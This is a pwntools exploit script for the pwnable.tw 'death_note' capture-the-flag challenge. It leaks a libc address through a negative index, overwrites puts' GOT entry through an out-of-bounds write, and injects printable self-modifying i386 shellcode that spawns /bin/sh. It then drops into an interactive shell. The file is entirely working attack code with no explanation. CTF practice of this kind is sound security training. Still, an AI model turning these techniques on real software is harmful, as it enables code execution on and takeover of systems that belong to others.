from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
debug = 1
if debug == 1:
	p = process('./death_note')
else:
	p = remote('chall.pwnable.tw', 10201)

def add(idx, name):
	p.recvuntil('choice :')
	p.sendline('1')
	p.recvuntil('Index :')
	p.sendline(str(idx))
	p.recvuntil('Name :')
	p.sendline(name)

def show(idx):
	p.recvuntil('choice :')
	p.sendline('2')
	p.recvuntil('Index :')
	p.sendline(str(idx))	

def delete(idx):
	p.recvuntil('choice :')
	p.sendline('3')
	p.recvuntil('Index :')
	p.sendline(str(idx))

#gdb.attach(p)
show(-8)
p.recv(11)
libc_base = u32(p.recv(4)) - 0x1b25e7
log.info('libc_base: ' + hex(libc_base))

elf = ELF('./death_note')

bss = 0x804a060
puts_got = elf.got['puts']
print hex(puts_got)

offset = (puts_got - bss)/4

shellcode = '''
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx

    push edx
    pop eax
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x34] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x34] , dl

    push ecx
    pop edx



    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b    
    push edx
    pop edx
    push edx
    pop edx
'''
print hex(len(asm(shellcode)))
shellcode = asm(shellcode) + '\x6b\x40'

add(offset,shellcode)

p.interactive()
